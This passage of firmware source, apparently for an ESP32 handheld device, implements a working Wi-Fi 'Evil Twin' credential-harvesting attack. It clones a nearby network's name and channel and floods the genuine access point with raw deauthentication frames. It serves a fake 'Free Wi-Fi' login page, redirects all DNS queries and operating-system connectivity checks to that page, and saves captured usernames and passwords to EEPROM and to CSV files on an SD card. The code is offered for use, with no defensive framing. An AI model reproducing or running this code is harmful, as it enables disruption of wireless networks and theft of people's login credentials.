static uint8_t cp_deauth_frame[sizeof(cp_deauth_frame_default)];
DNSServer dnsServer;
const byte DNS_PORT = 53;
WebServer server(80);

bool attackActive = false;

static void stopAttack();
static void startAttack();
void drawMainMenu();

#define EEPROM_SIZE 1440
#define SSID_ADDR 0
#define CRED_ADDR 32
#define COUNT_ADDR 1248
#define MAX_CREDS 20
#define CRED_SIZE 64

String terminalBuffer[MAX_LINES];
uint16_t colorBuffer[MAX_LINES];
int lineIndex = 0;

struct Credential {
  char username[16];
  char password[16];
  char ssid[32];
};

enum Screen { MAIN_MENU, KEYBOARD, CRED_LIST };
Screen currentScreen = MAIN_MENU;
int credPage = 0;

bool keyboardActive = false;
String inputSSID = "";
const int keyWidth = 22;
const int keyHeight = 18;
const int keySpacing = 2;
const char* keyboardLayout[] = {
  "1234567890",
  "qwertyuiop",
  "asdfghjkl ",
  "zxcvbnm_<-"
};
bool cursorState = false;
unsigned long lastCursorToggle = 0;

const char* seriesSSIDs[] = {"ESP32DIV_AP", "FreeWiFi", "Loading..."};
const int numSeriesSSIDs = 3;
int seriesSSIDIndex = 0;

String loginPage = R"(
<!DOCTYPE html>
<html>
<head>
  <title>Wi-Fi Login</title>
  <meta name='viewport' content='width=device-width, initial-scale=1'>
  <meta http-equiv='Cache-Control' content='no-cache, no-store, must-revalidate'>
  <meta http-equiv='Pragma' content='no-cache'>
  <meta http-equiv='Expires' content='0'>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background-color: #f0f0f0; }
    h1 { color: #333; }
    .container { max-width: 400px; margin: auto; padding: 20px; background: white; border-radius: 10px; }
    input { padding: 10px; margin: 10px 0; width: 100%; box-sizing: border-box; border: 1px solid #ccc; border-radius: 5px; }
    button { padding: 10px; background-color: #007BFF; color: white; border: none; border-radius: 5px; cursor: pointer; width: 100%; }
    button:hover { background-color: #0056b3; }
  </style>
</head>
<body>
  <div class='container'>
    <h1>Free Wi-Fi</h1>
    <p>Log in to connect.</p>
    <form action='/login' method='POST'>
      <input type='text' name='username' placeholder='Username' required><br>
      <input type='password' name='password' placeholder='Password' required><br>
      <button type='submit'>Log In</button>
    </form>
  </div>
</body>
</html>
)";

void scrollTerminal() {
  for (int i = 0; i < MAX_LINES - 1; i++) {
    terminalBuffer[i] = terminalBuffer[i + 1];
    colorBuffer[i] = colorBuffer[i + 1];
  }
}

void displayPrint(String text, uint16_t color, bool extraSpace = false) {
  if (lineIndex >= MAX_LINES - 1) {
    scrollTerminal();
    lineIndex = MAX_LINES - 1;
  }

  terminalBuffer[lineIndex] = text;
  colorBuffer[lineIndex] = color;
  lineIndex++;

  if (extraSpace && lineIndex < MAX_LINES) {
    terminalBuffer[lineIndex] = "";
    colorBuffer[lineIndex] = TFT_WHITE;
    lineIndex++;
  }

  for (int i = 0; i < lineIndex; i++) {
    int yPos = i * LINE_HEIGHT + 45;
    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);
    tft.setTextColor(colorBuffer[i], TFT_BLACK);
    tft.setCursor(5, yPos);
    tft.print(terminalBuffer[i]);
  }
}

void saveCredential(String username, String password, String ssid) {
  Credential cred;
  strncpy(cred.username, username.c_str(), 15);
  cred.username[15] = '\0';
  strncpy(cred.password, password.c_str(), 15);
  cred.password[15] = '\0';
  strncpy(cred.ssid, ssid.c_str(), 31);
  cred.ssid[31] = '\0';

  int count = EEPROM.read(COUNT_ADDR);
  Serial.printf("Before saving, credential count: %d\n", count);
  if (count < MAX_CREDS) {
    int addr = CRED_ADDR + (count * CRED_SIZE);
    EEPROM.put(addr, cred);
    count++;
    EEPROM.write(COUNT_ADDR, count);
    EEPROM.commit();
    Serial.println("Credential saved at address " + String(addr));
    Serial.println("Username: " + String(cred.username));
    Serial.println("Password: " + String(cred.password));
    Serial.println("SSID: " + String(cred.ssid));
    Serial.printf("After saving, credential count: %d\n", count);
  } else {
    Serial.println("Credential storage full");
  }
}

static bool cp_sd_mounted = false;

static bool cpMountSD() {

  if (cp_sd_mounted) {
    if (SD.exists("/")) return true;
    cp_sd_mounted = false;
  }

  bool ok = false;
  #ifdef SD_CS
  ok = SD.begin(SD_CS);
  #endif
  #ifdef SD_CS_PIN
  if (!ok) {
    #ifdef CC1101_CS
    if (SD_CS_PIN != CC1101_CS) ok = SD.begin(SD_CS_PIN);
    #else
    ok = SD.begin(SD_CS_PIN);
    #endif
  }
  #endif
  cp_sd_mounted = ok;
  return ok;
}

static bool cpEnsureDir(const char* dirPath) {
  if (!cpMountSD()) return false;
  if (!SD.exists(dirPath)) {
    if (SD.mkdir(dirPath)) return true;

    if (dirPath && dirPath[0] == '/') return SD.mkdir(dirPath + 1);
    return false;
  }
  return true;
}

static String cpCsvEscape(const String& s) {
  bool needsQuotes = false;
  for (size_t i = 0; i < s.length(); i++) {
    char c = s[i];
    if (c == ',' || c == '"' || c == '\n' || c == '\r') { needsQuotes = true; break; }
  }
  if (!needsQuotes) return s;

  String out = "\"";
  for (size_t i = 0; i < s.length(); i++) {
    char c = s[i];
    if (c == '"') out += "\"\"";
    else out += c;
  }
  out += "\"";
  return out;
}

static bool cpAppendLineToFile(const char* path, const String& line) {
  if (!cpMountSD()) return false;

  File f = SD.open(path, "a");
  if (!f) {
    cp_sd_mounted = false;
    if (!cpMountSD()) return false;
    f = SD.open(path, "a");
    if (!f) return false;
  }

  bool ok = (f.print(line) > 0);
  f.flush();
  f.close();
  return ok;
}

static bool cpAppendCaptureToSD(const String& remoteIp, const String& username, const String& passwordStr, const String& ssid) {
  const char* dir = "/captive_portal";
  const char* path = "/captive_portal/captured.csv";
  if (!cpEnsureDir(dir)) return false;

  bool exists = SD.exists(path);
  if (!exists) {
    if (!cpAppendLineToFile(path, "millis,remote_ip,ssid,username,password\r\n")) return false;
  }

  String row;
  row.reserve(32 + remoteIp.length() + ssid.length() + username.length() + passwordStr.length());
  row += String(millis());
  row += ",";
  row += cpCsvEscape(remoteIp);
  row += ",";
  row += cpCsvEscape(ssid);
  row += ",";
  row += cpCsvEscape(username);
  row += ",";
  row += cpCsvEscape(passwordStr);
  row += "\r\n";
  return cpAppendLineToFile(path, row);
}

static bool cpDumpAllCredentialsToSD(int* outCount) {
  if (outCount) *outCount = 0;
  const char* dir  = "/captive_portal";
  const char* path = "/captive_portal/eeprom_dump.csv";
  if (!cpEnsureDir(dir)) return false;

  int count = EEPROM.read(COUNT_ADDR);
  if (count < 0) count = 0;
  if (count > MAX_CREDS) count = MAX_CREDS;

  File f = SD.open(path, "w");
  if (!f) {
    cp_sd_mounted = false;
    if (!cpMountSD()) return false;
    f = SD.open(path, "w");
    if (!f) return false;
  }

  f.print("index,ssid,username,password\r\n");
  for (int i = 0; i < count; i++) {
    Credential cred;
    EEPROM.get(CRED_ADDR + (i * CRED_SIZE), cred);
    String line;
    line.reserve(16 + strlen(cred.ssid) + strlen(cred.username) + strlen(cred.password));
    line += String(i);
    line += ",";
    line += cpCsvEscape(String(cred.ssid));
    line += ",";
    line += cpCsvEscape(String(cred.username));
    line += ",";
    line += cpCsvEscape(String(cred.password));
    line += "\r\n";
    f.print(line);
  }
  f.flush();
  f.close();
  if (outCount) *outCount = count;
  return true;
}

static void cpCredListStatus(const String& msg, uint16_t color) {
  const int y = 272;
  tft.fillRect(0, y, 240, 16, TFT_BLACK);
  tft.setTextColor(color, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(2, y + 4);
  tft.print(msg);
}

static void cpStartDeauth(const String& ssid, const uint8_t* bssid, uint8_t channel) {
  if (cp_deauth_active) return;

  memset(&cp_target_ap, 0, sizeof(cp_target_ap));
  strcpy((char*)cp_target_ap.ssid, ssid.c_str());
  memcpy(cp_target_ap.bssid, bssid, 6);
  cp_target_ap.primary = channel;
  cp_target_channel = channel;

  cp_deauth_active = true;
  cp_deauth_packet_count = 0;
  cp_deauth_success_count = 0;
  cp_last_deauth_time = 0;

  Serial.printf("[CP Deauth] Starting deauth against cloned AP: %s CH=%u\n", ssid.c_str(), channel);
}

static void cpStopDeauth() {
  if (!cp_deauth_active) return;

  cp_deauth_active = false;
  Serial.printf("[CP Deauth] Stopped deauth (packets: %u, success: %u)\n",
                (unsigned)cp_deauth_packet_count, (unsigned)cp_deauth_success_count);
}

static void cpSendDeauthFrame() {
  if (!cp_deauth_active) return;

  esp_wifi_set_channel(cp_target_channel, WIFI_SECOND_CHAN_NONE);

  memcpy(cp_deauth_frame, cp_deauth_frame_default, 26);
  memcpy(&cp_deauth_frame[10], cp_target_ap.bssid, 6);
  memcpy(&cp_deauth_frame[16], cp_target_ap.bssid, 6);
  cp_deauth_frame[26] = 7;
  Deauther::wsl_bypasser_send_raw_frame(cp_deauth_frame, 26);

  memcpy(cp_deauth_frame, cp_deauth_frame_default, 26);
  memcpy(&cp_deauth_frame[10], cp_target_ap.bssid, 6);
  memcpy(&cp_deauth_frame[16], cp_target_ap.bssid, 6);

  memset(&cp_deauth_frame[4], 0xFF, 6);
  cp_deauth_frame[26] = 7;
  Deauther::wsl_bypasser_send_raw_frame(cp_deauth_frame, 26);

  cp_deauth_packet_count += 2;
}

static void handleGenerate204() {
  Serial.println("Android /generate_204 requested");
  displayPrint("Android /generate_204 requested", GREEN, false);
  server.sendHeader("Location", "/login.html", true);
  server.send(302, "text/plain", "");
}

static void handleHotspotDetect() {
  Serial.println("iOS /hotspot-detect.html requested");
  displayPrint("iOS /hotspot-detect.html requested", GREEN, false);
  server.send(200, "text/html", loginPage);
}

static void handleCaptiveApple() {
  Serial.println("iOS /captive.apple.com requested");
  displayPrint("iOS /captive.apple.com requested", GREEN, false);
  server.send(200, "text/html", "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>");
}

static void handleNCSITxt() {
  Serial.println("Windows /ncsi.txt requested");
  displayPrint("Windows /ncsi.txt requested", GREEN, false);
  server.send(200, "text/plain", "Microsoft NCSI");
}

static void handleConnectTestTxt() {
  Serial.println("Windows /connecttest.txt requested");
  displayPrint("Windows /connecttest.txt requested", GREEN, false);
  server.send(200, "text/plain", "Microsoft Connect Test");
}

static void handleLoginPage() {
  Serial.println("Login page (/login.html) requested");
  displayPrint("Login page (/login.html) requested", GREEN, false);
  server.send(200, "text/html", loginPage);
}

static void handleRoot() {
  Serial.println("Root (/) requested");
  displayPrint("Root (/) requested", GREEN, false);
  server.send(200, "text/html", loginPage);
}

static void handleLoginPost() {
  String username = server.arg("username");
  String password = server.arg("password");
  String remoteIp = server.client().remoteIP().toString();
  Serial.println("Captured Credentials:");
  Serial.println("Username: " + username);
  Serial.println("Password: " + password);
  Serial.println("SSID: " + String(custom_ssid));
  saveCredential(username, password, custom_ssid);
  if (cpAppendCaptureToSD(remoteIp, username, password, String(custom_ssid))) {
    Serial.println("[SD] Captive capture appended to /captive_portal/captured.csv");
  } else {
    Serial.println("[SD] Captive capture export failed (SD not mounted / write error)");
  }
  server.send(200, "text/html", "<h1>Login Successful!</h1><p>You are now connected.</p>");
}

static void handleNotFound() {
  Serial.println("Not found: " + server.uri());
  server.sendHeader("Location", "/login.html", true);
  server.send(302, "text/plain", "");
}

void setupWebServer() {
  server.on("/generate_204", HTTP_GET, static_cast<void (*)()>(handleGenerate204));
  server.on("/hotspot-detect.html", HTTP_GET, static_cast<void (*)()>(handleHotspotDetect));
  server.on("/captive.apple.com", HTTP_GET, static_cast<void (*)()>(handleCaptiveApple));
  server.on("/ncsi.txt", HTTP_GET, static_cast<void (*)()>(handleNCSITxt));
  server.on("/connecttest.txt", HTTP_GET, static_cast<void (*)()>(handleConnectTestTxt));
  server.on("/login.html", HTTP_GET, static_cast<void (*)()>(handleLoginPage));
  server.on("/", HTTP_GET, static_cast<void (*)()>(handleRoot));
  server.on("/login", HTTP_POST, static_cast<void (*)()>(handleLoginPost));
  server.onNotFound(static_cast<void (*)()>(handleNotFound));
}

void loadSSID() {
  String savedSSID = "";
  for (int i = 0; i < 32; i++) {
    char c = EEPROM.read(SSID_ADDR + i);
    if (c == 0) break;
    savedSSID += c;
  }
  if (savedSSID.length() > 0) {
    savedSSID.toCharArray(custom_ssid, 32);
  } else {
    strcpy(custom_ssid, default_ssid);
  }
}

void saveSSID(String ssid) {
  for (int i = 0; i < 32; i++) {
    if (i < ssid.length()) {
      EEPROM.write(SSID_ADDR + i, ssid[i]);
    } else {
      EEPROM.write(SSID_ADDR + i, 0);
    }
  }
  EEPROM.commit();
  ssid.toCharArray(custom_ssid, 32);
  if (attackActive) {
    WiFi.softAPdisconnect(true);
    WiFi.softAP(custom_ssid, password, ap_channel);
    Serial.println("New SSID set: " + String(custom_ssid));
  }
}

void deleteCredential(int index) {
  int count = EEPROM.read(COUNT_ADDR);
  if (index < 0 || index >= count) {
    Serial.println("Invalid credential index: " + String(index));
    return;
  }

  for (int i = index; i < count - 1; i++) {
    Credential cred;
    EEPROM.get(CRED_ADDR + ((i + 1) * CRED_SIZE), cred);
    EEPROM.put(CRED_ADDR + (i * CRED_SIZE), cred);
  }

  count--;
  EEPROM.write(COUNT_ADDR, count);
  EEPROM.commit();
  Serial.println("Credential deleted at index " + String(index));
  Serial.printf("New credential count: %d\n", count);
}

void clearAllCredentials() {
  EEPROM.put(COUNT_ADDR, (uint32_t)0);

  int endAddr = CRED_ADDR + (MAX_CREDS * CRED_SIZE);
  if (endAddr > COUNT_ADDR) {
    Serial.println("Error: Credential clear would overwrite counter!");
    endAddr = COUNT_ADDR;
  }
  for (int i = CRED_ADDR; i < endAddr; i++) {
    EEPROM.write(i, 0);
  }
  EEPROM.commit();
  Serial.println("All credentials cleared from " + String(CRED_ADDR) + " to " + String(endAddr - 1));
}

static void cpDrawCloneFrame(const char* title) {
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.setTextSize(1);
  tft.setTextColor(GREEN, TFT_BLACK);
  tft.setCursor(8, 45);
  tft.println(title);
}

static void cpDrawCloneFooter(bool prevEnabled, bool nextEnabled) {

  FeatureUI::drawFooterBg();

  FeatureUI::Button btns[4];

  FeatureUI::layoutFooter4(
    btns,
    "Back", FeatureUI::ButtonStyle::Secondary,
    "Scan", FeatureUI::ButtonStyle::Secondary,
    "Prev", FeatureUI::ButtonStyle::Secondary,
    "Next", FeatureUI::ButtonStyle::Secondary,
    false, false, !prevEnabled, !nextEnabled
  );

  for (int i = 0; i < 4; ++i) {
    FeatureUI::drawButtonRect(btns[i].x, btns[i].y, btns[i].w, btns[i].h,
                              btns[i].label, btns[i].style,
                              false, btns[i].disabled,
                              1);
  }
}

static bool cpCloneScanAndSelect(String& outSsid, uint8_t& outChannel, uint8_t outBssid[6]) {
  const int MAX_RESULTS = 40;
  const int rowsPerPage = 12;

  while (true) {

    if (feature_active && isButtonPressed(BTN_SELECT)) return false;

    cpDrawCloneFrame("Scanning...");
    loading(90, ORANGE, 0, 0, 2, true);

    WiFi.scanDelete();
    int n = WiFi.scanNetworks(false, true);
    if (n <= 0) {
      cpDrawCloneFrame("No networks found");
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.setCursor(8, 62);
      tft.println("Tap Scan, or Back.");
      cpDrawCloneFooter(false, false);

      int x, y;
      while (!readTouchXY(x, y)) delay(10);
      delay(200);
      const int footerY = tft.height() - FeatureUI::FOOTER_H;
      if (y >= footerY) {
        if (x < 60) return false;
        if (x < 120) continue;
      }
      continue;
    }

    int count = min(n, MAX_RESULTS);
    int idx[MAX_RESULTS];
    for (int i = 0; i < count; i++) idx[i] = i;

    for (int i = 0; i < count - 1; i++) {
      int best = i;
      for (int j = i + 1; j < count; j++) {
        if (WiFi.RSSI(idx[j]) > WiFi.RSSI(idx[best])) best = j;
      }
      if (best != i) {
        int tmp = idx[i];
        idx[i] = idx[best];
        idx[best] = tmp;
      }
    }

    int page = 0;
    while (true) {
      if (feature_active && isButtonPressed(BTN_SELECT)) return false;

      cpDrawCloneFrame("Clone Access Point");
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.setCursor(8, 62);
      tft.println("Tap a network to clone SSID+CH");

      int totalPages = (count + rowsPerPage - 1) / rowsPerPage;
      tft.setTextColor(GREEN, TFT_BLACK);
      tft.setCursor(180, 45);
      tft.printf("%d/%d", page + 1, max(1, totalPages));

      int y = 80;
      int start = page * rowsPerPage;
      int end = min(start + rowsPerPage, count);
      for (int row = start; row < end; row++) {
        int real = idx[row];
        String ssid = WiFi.SSID(real);
        int rssi = WiFi.RSSI(real);
        int ch = WiFi.channel(real);
        uint8_t auth = WiFi.encryptionType(real);
        const char* enc = (auth == WIFI_AUTH_OPEN) ? "OPEN" : "SEC";

        String disp = ssid;
        if (disp.length() > 14) disp = disp.substring(0, 14) + "...";

        char buf[64];
        snprintf(buf, sizeof(buf), "%02d %-17s %3d Ch%2d %s", row + 1, disp.c_str(), rssi, ch, enc);

        uint16_t color = (auth == WIFI_AUTH_OPEN) ? ORANGE : TFT_WHITE;
        tft.setTextColor(color, TFT_BLACK);
        tft.setCursor(8, y);
        tft.println(buf);
        y += 16;
      }

      bool prevEnabled = page > 0;
      bool nextEnabled = (page + 1) * rowsPerPage < count;
      cpDrawCloneFooter(prevEnabled, nextEnabled);

      int tx, ty;
      while (!readTouchXY(tx, ty)) delay(10);
      delay(200);

      const int footerY = tft.height() - FeatureUI::FOOTER_H;
      if (ty >= footerY) {
        if (tx < 60) return false;
        if (tx < 120) break;
        if (tx < 180 && prevEnabled) { page--; continue; }
        if (tx >= 180 && nextEnabled) { page++; continue; }
        continue;
      }

      if (ty >= 80 && ty < 80 + (rowsPerPage * 16)) {
        int clickedOffset = (ty - 80) / 16;
        int absoluteRow = page * rowsPerPage + clickedOffset;
        if (absoluteRow >= start && absoluteRow < end) {
          int real = idx[absoluteRow];
          outSsid = WiFi.SSID(real);
          outChannel = (uint8_t)WiFi.channel(real);

          memcpy(outBssid, WiFi.BSSID(real), 6);
          return true;
        }
      }
    }
  }
}

static void cpCloneExistingAPFlow() {
  bool wasActive = attackActive;
  if (attackActive) stopAttack();

  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true);
  delay(100);

  String chosen;
  uint8_t ch = 1;
  uint8_t bssid[6] = {0};
  bool ok = cpCloneScanAndSelect(chosen, ch, bssid);
  WiFi.scanDelete();

  if (!ok) {
    if (wasActive) startAttack();
    drawMainMenu();
    return;
  }

  ap_channel = (ch == 0 ? 1 : ch);
  saveSSID(chosen);
  Serial.printf("[CP] Cloned AP: SSID='%s' CH=%u\n", custom_ssid, (unsigned)ap_channel);

  memset(&cp_target_ap, 0, sizeof(cp_target_ap));
  strcpy((char*)cp_target_ap.ssid, chosen.c_str());
  memcpy(cp_target_ap.bssid, bssid, 6);
  cp_target_ap.primary = ap_channel;

  cpStartDeauth(chosen, bssid, ap_channel);

  delay(500);

  startAttack();
  drawMainMenu();
}

void drawMainMenu() {
  currentScreen = MAIN_MENU;

  tft.setTextSize(1);
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);

  displayPrint("Current SSID:", GREEN, false);
  displayPrint(custom_ssid, WHITE, false);
  displayPrint("...", GREEN, false);

  displayPrint("Channel: " + String(ap_channel), GREEN, false);
  displayPrint(attackActive ? "Status: Active" : "Status: Inactive", GREEN, false);
  if (cp_deauth_active) {
    char buf[32];
    snprintf(buf, sizeof(buf), "Evil Twin: %u pkts", (unsigned)cp_deauth_packet_count);
    displayPrint(buf, ORANGE, false);
  }
}

void drawInputField() {
  tft.fillRect(10, 55, 220, 25, TFT_DARKGREY);
  tft.drawRect(9, 54, 222, 27, ORANGE);
  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(2);
  tft.setCursor(15, 60);
  String displayText = inputSSID;
  if (cursorState && keyboardActive) {
    displayText += "|";
  }
  tft.println(displayText);
}

void drawKeyboard() {
  currentScreen = KEYBOARD;
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);

  tft.setTextColor(ORANGE);
  tft.setTextSize(1);
  tft.setCursor(1, 230);
  tft.println("[!] Set the SSID that your AP will use");
  tft.setCursor(20, 245);
  tft.println("to host the captive portal.");

  tft.setCursor(1, 270);
  tft.println("[!] Shuffle: Randomly generates SSID");
  tft.setCursor(20, 285);
  tft.println("suggestions for your access point.");

  drawInputField();

  int yOffset = 95;
  for (int row = 0; row < 4; row++) {
    int xOffset = 1;
    for (int col = 0; col < strlen(keyboardLayout[row]); col++) {
      tft.fillRect(xOffset, yOffset, keyWidth, keyHeight, TFT_DARKGREY);
      tft.setTextColor(TFT_WHITE);
      tft.setTextSize(1);
      tft.setCursor(xOffset + 6, yOffset + 5);
      tft.print(keyboardLayout[row][col]);
      Serial.printf("Key %c at x=%d-%d, y=%d-%d\n", keyboardLayout[row][col], xOffset, xOffset + keyWidth, yOffset, yOffset + keyHeight);
      xOffset += keyWidth + keySpacing;
    }
    yOffset += keyHeight + keySpacing;
  }

tft.setTextColor(ORANGE);
tft.setTextSize(1);
tft.setTextDatum(MC_DATUM);

tft.fillRoundRect(5, 185, 70, 25, 4, DARK_GRAY);
tft.drawRoundRect(5, 185, 70, 25, 4, ORANGE);
tft.drawString("Back", 40, 197);
Serial.printf("Back button at x=5-75, y=185-210\n");

tft.fillRoundRect(85, 185, 70, 25, 4, DARK_GRAY);
tft.drawRoundRect(85, 185, 70, 25, 4, ORANGE);
tft.drawString("Shuffle", 120, 197);
Serial.printf("Series button at x=85-155, y=185-210\n");

tft.fillRoundRect(165, 185, 70, 25, 4, DARK_GRAY);
tft.drawRoundRect(165, 185, 70, 25, 4, ORANGE);
tft.drawString("OK", 200, 197);
Serial.printf("OK button at x=165-235, y=185-210\n");
}

void drawCredList() {
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(1);
  tft.setCursor(0, 50);
  tft.println("Credentials List:");

  tft.setCursor(0, 70);
  tft.print("User");
  tft.setCursor(80, 70);
  tft.print("Pass");
  tft.setCursor(160, 70);
  tft.print("SSID");
  tft.drawLine(0, 80, 245, 80, TFT_WHITE);

  int count = EEPROM.read(COUNT_ADDR);
  Serial.printf("Reading %d credentials from EEPROM\n", count);

  int startIdx = credPage * 18;
  int yOffset = 90;

  if (count == 0) {
    tft.setCursor(0, yOffset);
    tft.println("No credentials");
    Serial.println("No credentials found");
  } else {
    for (int i = startIdx; i < min(count, startIdx + 18); i++) {
      Credential cred;
      EEPROM.get(CRED_ADDR + (i * CRED_SIZE), cred);
      Serial.printf("Credential %d at address %d: User=%s, Pass=%s, SSID=%s\n",
                    i, CRED_ADDR + (i * CRED_SIZE), cred.username, cred.password, cred.ssid);

      tft.setTextColor(TFT_WHITE);
      tft.setCursor(0, yOffset);
      tft.println(cred.username);
      tft.setCursor(80, yOffset);
      tft.println(cred.password);
      tft.setCursor(160, yOffset);
      tft.println(cred.ssid);

      tft.setTextColor(UI_WARN);
      tft.setCursor(223, yOffset - 1);
      tft.println("X");

      yOffset += 10;
    }
  }

int buttonY = 290;
tft.setTextColor(ORANGE);
tft.setTextSize(1);
tft.setTextDatum(MC_DATUM);

tft.fillRoundRect(5, buttonY, 50, 20, 8, DARK_GRAY);
tft.drawRoundRect(5, buttonY, 50, 20, 8, ORANGE);
tft.drawString("Back", 30, buttonY + 10);

tft.fillRoundRect(65, buttonY, 50, 20, 8, DARK_GRAY);
tft.drawRoundRect(65, buttonY, 50, 20, 8, ORANGE);
tft.drawString("Clear", 90, buttonY + 10);

tft.fillRoundRect(125, buttonY, 50, 20, 8, DARK_GRAY);
tft.drawRoundRect(125, buttonY, 50, 20, 8, ORANGE);
tft.drawString("Export", 150, buttonY + 10);

if (credPage > 0) {
  tft.fillRoundRect(185, buttonY, 50, 20, 8, DARK_GRAY);
  tft.drawRoundRect(185, buttonY, 50, 20, 8, ORANGE);
  tft.drawString("Prev", 210, buttonY + 10);
} else if (count > (credPage + 1) * 15) {
  tft.fillRoundRect(185, buttonY, 50, 20, 8, DARK_GRAY);
  tft.drawRoundRect(185, buttonY, 50, 20, 8, ORANGE);
  tft.drawString("Next", 210, buttonY + 10);
}

}

void stopAttack() {
  if (attackActive) {
    WiFi.softAPdisconnect(true);
    Serial.println("Access Point stopped");
    displayPrint("Access Point stopped", GREEN, false);

    dnsServer.stop();
    Serial.println("DNS server stopped");
    displayPrint("DNS server stopped", GREEN, false);

    server.close();
    Serial.println("Web server stopped");
    displayPrint("Web server stopped", GREEN, false);

    cpStopDeauth();

    attackActive = false;
    drawMainMenu();
  } else {
    Serial.println("Attack already inactive");
    displayPrint("Attack already inactive", GREEN, false);
  }
}

void startAttack() {
  if (!attackActive) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP(custom_ssid, password, ap_channel);
    Serial.println("Access Point started");
    Serial.print("IP Address: ");
    Serial.println(WiFi.softAPIP());
    int ip = WiFi.softAPIP();
    displayPrint("Access Point started", GREEN, false);

    dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    Serial.println("DNS server started");
    displayPrint("DNS server started", GREEN, false);

    setupWebServer();
    server.begin();
    Serial.println("Web server started");
    displayPrint("Web server started", GREEN, false);

    attackActive = true;
    drawMainMenu();
  } else {
    Serial.println("Attack already active");
    displayPrint("Attack already active", GREEN, false);
  }
}

void handleMainMenu(int x, int y) {
  (void)x;
  (void)y;
}

void handleKeyboard(int x, int y) {
  (void)x;
  (void)y;
}

void handleCredList(int x, int y) {
  int count = EEPROM.read(COUNT_ADDR);
  int startIdx = credPage * 18;
  int yOffset = 80;

  for (int i = startIdx; i < min(count, startIdx + 18); i++) {
    if (x >= 220 && x <= 230 && y >= yOffset - 3 && y <= yOffset + 7) {
      Serial.println("Delete button pressed for credential " + String(i));
      deleteCredential(i);
      drawCredList();
      return;
    }
    yOffset += 10;
  }

  int buttonY = 290;

  if (x >= 5 && x <= 55 && y >= buttonY && y <= buttonY + 20) {
    Serial.println("Back button pressed");
    currentScreen = MAIN_MENU;
    drawMainMenu();
  }
  if (x >= 65 && x <= 115 && y >= buttonY && y <= buttonY + 20) {
    Serial.println("Clear All button pressed");
    clearAllCredentials();
    credPage = 0;
    drawCredList();
  }
  if (x >= 125 && x <= 175 && y >= buttonY && y <= buttonY + 20) {
    Serial.println("Export button pressed");
    int dumped = 0;
    if (cpDumpAllCredentialsToSD(&dumped)) {
      cpCredListStatus("Exported " + String(dumped) + " -> SD:/captive_portal/eeprom_dump.csv", TFT_GREEN);
    } else {
      cpCredListStatus("Export failed: SD not ready", TFT_RED);
    }
  }
  if (credPage > 0 && x >= 185 && x <= 235 && y >= buttonY && y <= buttonY + 20) {
    Serial.println("Prev button pressed");
    credPage--;
    drawCredList();
  } else if (count > (credPage + 1) * 15 && x >= 185 && x <= 235 && y >= buttonY && y <= buttonY + 20) {
    Serial.println("Next button pressed");
    credPage++;
    drawCredList();
  }
}

static bool uiDrawn = false;

void runUI() {
#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 6

  static int iconX[ICON_NUM] = {90, 130, 170, 210, 50, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_dialog,
    bitmap_icon_list,
    bitmap_icon_antenna,
    bitmap_icon_power,
    bitmap_icon_wifi2,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;
  static unsigned long lastSpamTime = 0;

  switch (animationState) {
    case 0:
      break;

    case 1:
      if (millis() - lastAnimationTime >= 150) {
        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = millis();
      }
      break;

    case 2:
      if (millis() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = millis();
      }
      break;

    case 3:
      switch (activeIcon) {
        case 0: {

          OnScreenKeyboardConfig cfg;
          cfg.titleLine1      = "[!] Set the SSID that your AP will use";
          cfg.titleLine2      = "to host the captive portal.";
          cfg.rows            = keyboardLayout;
          cfg.rowCount        = 4;
          cfg.maxLen          = 31;
          cfg.shuffleNames    = seriesSSIDs;
          cfg.shuffleCount    = numSeriesSSIDs;
          cfg.buttonsY        = 195;
          cfg.backLabel       = "Back";
          cfg.middleLabel     = "Shuffle";
          cfg.okLabel         = "OK";
          cfg.enableShuffle   = true;
          cfg.requireNonEmpty = true;
          cfg.emptyErrorMsg   = "SSID cannot be empty!";

          OnScreenKeyboardResult r = showOnScreenKeyboard(cfg, inputSSID);
          if (r.accepted && r.text.length() > 0) {
            inputSSID = r.text;
            saveSSID(inputSSID);
          }
          drawMainMenu();
          animationState = 0;
          activeIcon = -1;
          break;
        }
        case 1:
          currentScreen = CRED_LIST;
          credPage = 0;
          drawCredList();
          animationState = 0;
          activeIcon = -1;
          break;
        case 2:
          startAttack();
          animationState = 0;
          activeIcon = -1;
          break;
        case 3:
          stopAttack();
          animationState = 0;
          activeIcon = -1;
          break;

         case 4:
